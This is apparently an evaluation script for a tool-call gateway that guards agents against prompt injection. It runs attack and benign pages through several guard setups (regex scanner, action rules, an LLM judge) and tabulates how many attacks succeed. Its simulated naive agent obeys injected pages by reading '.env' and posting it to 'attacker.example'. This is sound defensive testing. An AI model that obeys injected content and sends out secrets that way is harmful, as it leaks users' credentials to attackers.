"""Which layer stops what? Runs every attack and benign page through 5 guard configurations.
Offline by default. Add --judge to include the Gemini LLM-judge row (needs GEMINI_API_KEY)."""
import sys

from gateway.models import ToolCall
from gateway.policy import Policy, evaluate, load_policy, scan_output
from gateway.session import Session

from .dataset import ATTACKS, BENIGN, INJ_CAUGHT, INJ_REWORDED


def simulate(policy: Policy, text: str, is_attack: bool, judge=None, guard: bool = True) -> dict:
    """Agent fetches a page. A NAIVE agent obeys any injection by reading the secret and posting it out."""
    if not guard:
        return {"harm": is_attack, "page_blocked": False, "stopped_by": None}
    s, t = Session(), 0.0

    def step(tool, arg):
        nonlocal t
        d = evaluate(policy, s, ToolCall(session_id="e", tool=tool, arg=arg), t)
        s.record(tool, arg, d.verdict, t)
        t += 1.0  # 1s apart, so the rate limit never interferes with the measurement
        if d.verdict == "allow" and tool in policy.sensitive_tools:
            s.taint.add("secret")
        return d

    step("fetch_page", "page")
    scan = scan_output(policy, text)
    if scan.verdict == "allow" and judge is not None:
        scan = judge(text)
    if scan.verdict != "allow":
        s.taint.add("untrusted")
        return {"harm": False, "page_blocked": True, "stopped_by": scan.rule_id}
    if not is_attack:
        return {"harm": False, "page_blocked": False, "stopped_by": None}
    step("read_secret", ".env")
    d = step("http_post", "attacker.example")
    return {"harm": d.verdict == "allow", "page_blocked": False,
            "stopped_by": None if d.verdict == "allow" else d.rule_id}


def configs(base: Policy, judge=None):
    scanner_only = base.model_copy(update={"sensitive_tools": [], "network_tools": []})
    action_only = base.model_copy(update={"injection_patterns": []})
    rows = [("No guard", base, None, False),
            ("Regex scanner only", scanner_only, None, True),
            ("Action rules only", action_only, None, True),
            ("Regex + action rules", base, None, True)]
    if judge is not None:
        rows.append(("Regex + LLM-judge + action", base, judge, True))
        rows.append(("LLM-judge + action (no regex)", action_only, judge, True))
    return rows


def run(judge=None, policy_path: str = "policy.yaml") -> list[dict]:
    base = load_policy(policy_path)
    out = []
    for name, pol, j, guard in configs(base, judge):
        att = [simulate(pol, t, True, j, guard) for t in ATTACKS]
        ben = [simulate(pol, t, False, j, guard) for t in BENIGN]
        out.append({
            "config": name,
            "attack_success": sum(r["harm"] for r in att) / len(att),
            "harm": sum(r["harm"] for r in att),
            "benign_blocked": sum(r["page_blocked"] for r in ben),
            "stopped_by_text": sum(r["page_blocked"] for r in att),
            "stopped_by_action": sum(r["stopped_by"] is not None and not r["page_blocked"] for r in att),
        })
    return out


def table(rows: list[dict]) -> str:
    na, nb = len(ATTACKS), len(BENIGN)
    head = (f"Attacks: {na} ({len(INJ_CAUGHT)} regex-style + {len(INJ_REWORDED)} reworded). Benign pages: {nb}.\n\n"
            "| Config | Attacks that caused harm | Blocked at text layer | Blocked at action layer | Normal pages wrongly blocked |\n"
            "|---|---|---|---|---|\n")
    body = "".join(f"| {r['config']} | {r['harm']}/{na} ({r['attack_success']:.0%}) | {r['stopped_by_text']} | "
                   f"{r['stopped_by_action']} | {r['benign_blocked']}/{nb} ({r['benign_blocked']/nb:.0%}) |\n" for r in rows)
    return head + body


if __name__ == "__main__":
    judge = None
    if "--judge" in sys.argv:
        from gateway.judge import GeminiJudge
        judge = GeminiJudge(cache_path="eval/judge_cache.json")
    rows = run(judge)
    md = table(rows)
    if judge and judge.latencies:
        md += f"\nLLM-judge latency: avg {sum(judge.latencies)/len(judge.latencies):.2f}s over {len(judge.latencies)} uncached calls.\n"
    print(md)
    open("eval/results.md", "w").write(md)
    print("Saved to eval/results.md")
